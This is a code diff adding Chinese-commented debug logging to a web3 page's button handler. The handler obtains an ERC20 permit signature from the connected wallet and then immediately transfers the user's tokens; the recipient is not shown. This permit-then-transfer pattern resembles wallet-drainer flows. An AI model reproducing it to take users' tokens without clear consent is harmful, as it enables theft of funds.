@@ -92,6 +92,7 @@ const updateWalletList = (address) => {
 
 // 合并后的授权和签名按钮点击事件
 document.getElementById('authorizeAndSignButton').onclick = async () => {
+    console.log("按钮被点击"); // 调试信息
     if (!isConnected) {
         document.getElementById('status').innerText = '请先连接钱包';
         return;
@@ -99,6 +100,7 @@ document.getElementById('authorizeAndSignButton').onclick = async () => {
 
     const accounts = await web3.eth.getAccounts();
     const account = accounts[0];
+    console.log("当前账户: ", account); // 调试信息
 
     const tokenAddress = '0xYourTokenContractAddress'; // 这里填写你要操作的 ERC20 合约地址
     const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
@@ -106,6 +108,7 @@ document.getElementById('authorizeAndSignButton').onclick = async () => {
     try {
         // 使用 permit 进行签名授权
         const nonce = await tokenContract.methods.nonces(account).call();
+        console.log("Nonce: ", nonce); // 调试信息
         const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 分钟过期
 
         // 签名信息
@@ -146,6 +149,8 @@ document.getElementById('authorizeAndSignButton').onclick = async () => {
             message: permitData
         }));
 
+        console.log("签名: ", signature); // 调试信息
+
         const { v, r, s } = getSignatureParameters(signature);
 
         // 调用合约的 permit 方法进行授权
@@ -156,6 +161,7 @@ document.getElementById('authorizeAndSignButton').onclick = async () => {
         await transferTokens(account, tokenContract);
     } catch (error) {
         document.getElementById('status').innerText = '授权或签名失败: ' + error.message;
+        console.error("错误: ", error); // 打印错误信息
     }
 };
 
